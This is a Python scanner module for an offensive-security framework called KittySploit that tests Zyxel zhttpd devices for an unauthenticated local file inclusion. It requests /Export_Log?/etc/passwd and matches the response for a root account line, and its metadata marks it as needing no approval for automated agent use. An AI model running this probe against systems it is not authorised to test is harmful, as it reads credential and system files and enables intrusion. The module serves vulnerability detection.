#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""zhttpd is vulnerable to unauthenticated local inclusion including privileged files such as /etc/shadow."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'zhttpd - Local File Inclusion Detection',
        'description': 'zhttpd is vulnerable to unauthenticated local inclusion including privileged files such as /etc/shadow. An attacker can read all files on the system by using this endpoint.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'misconfig', 'unauth', 'zyxel', 'lfi', 'msf', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://sec-consult.com/blog/detail/enemy-within-unauthenticated-buffer-overflows-zyxel-routers/',
            'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/',
            'https://github.com/rapid7/metasploit-framework/pull/17388',
        ],
    }

    def run(self):
        path = '/Export_Log?/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': '*/*'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='zhttpd - Local File Inclusion detected', path=path)
            return True
        return False

